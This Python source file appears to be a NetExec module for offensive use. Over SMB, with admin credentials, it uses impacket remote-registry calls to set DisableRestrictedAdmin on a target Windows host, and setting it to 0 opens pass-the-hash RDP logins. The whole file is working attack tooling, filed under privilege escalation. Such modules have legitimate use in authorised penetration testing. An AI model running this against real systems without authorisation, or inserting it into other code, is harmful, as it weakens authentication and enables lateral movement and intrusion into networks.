from impacket.dcerpc.v5 import rrp
from impacket.examples.secretsdump import RemoteOperations
from nxc.helpers.misc import CATEGORY

class NXCModule:
    """Module by @mverschu — set DisableRestrictedAdmin under
    HKLM\\System\\CurrentControlSet\\Control\\Lsa
    """
    name = "restrictedadmin"
    description = 'Set HKLM\\System\\CurrentControlSet\\Control\\Lsa\\DisableRestrictedAdmin (REG_DWORD)'
    supported_protocols = ["smb"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        # default to None until options() validates it
        self.value = None

    def options(self, context, module_options):
        """
        Configure the module.

        Semantics:
          - Adding this with value 0:
              New-ItemProperty -Path "HKLM:\\System\\CurrentControlSet\\Control\\Lsa" -Name DisableRestrictedAdmin -Value 0
              => results in RDP being possible using an NTLM hash instead of an interactive password (weaker).
          - Setting this to 1:
              => back to default behavior.

        ACTION: "allow-hash" or "default" (preferred), or numeric "0" or "1" (required).
            - "allow-hash" or "0"  => write DisableRestrictedAdmin = 0
            - "default"    or "1"   => write DisableRestrictedAdmin = 1
        """
        if "ACTION" not in module_options:
            context.log.fail("ACTION option not specified! Use 'allow-hash'/'0' or 'default'/'1'.")
            return

        action = str(module_options["ACTION"]).lower().strip()

        mapping = {
            "allow-hash": 0,
            "0": 0,
            "default": 1,
            "1": 1,
        }

        if action not in mapping:
            context.log.fail("ACTION must be one of: 'allow-hash', 'default', '0', or '1'.")
            return

        self.value = mapping[action]
        context.log.debug(f"ACTION parsed, will set DisableRestrictedAdmin = {self.value}")

    def on_admin_login(self, context, connection):
        if self.value is None:
            context.log.fail("Module not configured correctly. Run with ACTION option.")
            return

        remote_ops = None
        try:
            remote_ops = RemoteOperations(connection.conn, False)
            remote_ops.enableRegistry()
            if not remote_ops._RemoteOperations__rrp:
                context.log.fail("Failed to obtain a registry handle.")
                return

            # Open HKEY_LOCAL_MACHINE
            ans = rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)
            reg_handle = ans["phKey"]

            # Ensure the key exists (System\CurrentControlSet\Control\Lsa)
            key_path = "System\\CurrentControlSet\\Control\\Lsa"
            try:
                key_handle = rrp.hBaseRegOpenKey(
                    remote_ops._RemoteOperations__rrp, reg_handle, key_path
                )["phkResult"]
            except Exception as e:
                context.log.debug(f"Key open failed ({e}), attempting to create key '{key_path}'")
                key_handle = rrp.hBaseRegCreateKey(
                    remote_ops._RemoteOperations__rrp, reg_handle, key_path
                )["phkResult"]

            # Value name must be null-terminated for impacket rrp calls
            value_name = "DisableRestrictedAdmin\x00"

            # Try query (informational), but we will set the value regardless
            try:
                cur = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, value_name)
                context.log.debug(f"Existing value queried (info): {repr(cur)}")
            except Exception as e:
                if "ERROR_FILE_NOT_FOUND" in str(e):
                    context.log.debug(f"Registry value '{value_name.strip(chr(0))}' does not exist; it will be created.")
                else:
                    context.log.debug(f"Query raised: {e} — will attempt to set the value anyway.")

            # Set the DWORD to the configured value (0 or 1)
            rrp.hBaseRegSetValue(
                remote_ops._RemoteOperations__rrp,
                key_handle,
                value_name,
                rrp.REG_DWORD,
                int(self.value),
            )

            if int(self.value) == 0:
                context.log.highlight(
                    "HKLM\\System\\CurrentControlSet\\Control\\Lsa\\DisableRestrictedAdmin set to 0 — RDP may accept NTLM hashes instead of interactive passwords."
                )
            else:
                context.log.highlight(
                    "HKLM\\System\\CurrentControlSet\\Control\\Lsa\\DisableRestrictedAdmin set to 1 — default behavior restored."
                )

            rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)

        except Exception as e:
            context.log.debug(f"Error while setting DisableRestrictedAdmin: {e}")
        finally:
            try:
                if remote_ops:
                    remote_ops.finish()
            except Exception:
                pass

